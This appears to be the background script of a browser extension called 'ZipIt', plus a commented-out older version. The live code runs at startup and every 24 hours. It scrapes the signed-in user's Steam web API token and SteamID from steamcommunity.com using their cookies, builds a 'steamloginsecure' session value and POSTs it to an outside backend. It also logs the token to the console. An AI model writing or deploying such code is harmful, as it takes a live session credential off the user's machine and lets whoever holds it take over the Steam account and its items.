import { environment } from "./environment";

async function fetchSteamToken() {
  try {
    const resp = await fetch("https://steamcommunity.com", {
      credentials: "include",
      headers: {
        Accept: "text/html,application/xhtml+xml,application/xml;q=0.9;q=0.8,application/signed-exchange;v=b3;q=0.7",
      },
    });

    const body = await resp.text();
    const match = /data-loyalty_webapi_token="&quot;([a-zA-Z0-9_.-]+)&quot;"/.exec(body);

    if (!match || match.length < 2) {
      throw new Error("Failed to parse web API token.");
    }

    const token = match[1];

    const steamIDMatch = /g_steamID = "(\d+?)"/.exec(body);
    if (!steamIDMatch || steamIDMatch.length === 0) {
      return null;
    }

    console.log(token, "token");

    const req = {
      steamloginsecure: `${steamIDMatch[1] + "||" + token}`,
      steamid: steamIDMatch[1],
    };

    console.log(req, "req");

    const res = await fetch(`${environment.zipit_base_api_url}/add_steamloginsecure`, {
      credentials: "include",
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(req),
    });

    const resBody = await res.json(); // Assuming the backend returns JSON data
    console.log(resBody, "Backend response");

    if (resp.status !== 200) {
      throw new Error("invalid status");
    }

    // Store the token in Chrome storage
    chrome.storage.local.set({ steamToken: token }, () => {
      console.log("Steam API token saved.");
    });
  } catch (error) {
    console.error("Error fetching Steam token:", error);
  }
}

// Run the function when the extension starts
fetchSteamToken();

// Create an alarm to fetch the token every 24 hours (86400 seconds)
chrome.runtime.onInstalled.addListener(() => {
  chrome.alarms.create("fetchSteamTokenAlarm", {
    periodInMinutes: 1440, // 24 hours
  });
});

// Listen for the alarm and fetch the token
chrome.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === "fetchSteamTokenAlarm") {
    fetchSteamToken();
  }
});

// import browser from "webextension-polyfill"; // Ensure cross-browser compatibility

// async function fetchSteamToken() {
//   try {
//     const resp = await fetch("https://steamcommunity.com", {
//       credentials: "include",
//       headers: {
//         Accept: "text/html,application/xhtml+xml,application/xml;q=0.9;q=0.8,application/signed-exchange;v=b3;q=0.7",
//       },
//     });

//     const body = await resp.text();
//     const match = body.match(/data-loyalty_webapi_token="&quot;([\w.-]+)&quot;"/);

//     if (!match || match.length < 2) {
//       throw new Error("Failed to parse Steam Web API token.");
//     }

//     const token = match[1];
//     console.log("Fetched Steam Token:", token);

//     // Store token in browser storage
//     if (browser.storage) {
//       await browser.storage.local.set({ steamToken: token });
//       console.log("Steam API token saved.");
//     }
//   } catch (error) {
//     console.error("Error fetching Steam token:", error);
//   }
// }

// // Run on extension install
// browser.runtime.onInstalled.addListener(() => {
//   console.log("ZipIt Extension Installed.");
//   fetchSteamToken();

//   // Create an alarm to refresh the token every 24 hours
//   browser.alarms.create("fetchSteamTokenAlarm", {
//     periodInMinutes: 1440, // 24 hours
//   });
// });

// // Listen for the alarm and refresh the token
// browser.alarms.onAlarm.addListener((alarm) => {
//   if (alarm.name === "fetchSteamTokenAlarm") {
//     fetchSteamToken();
//   }
// });
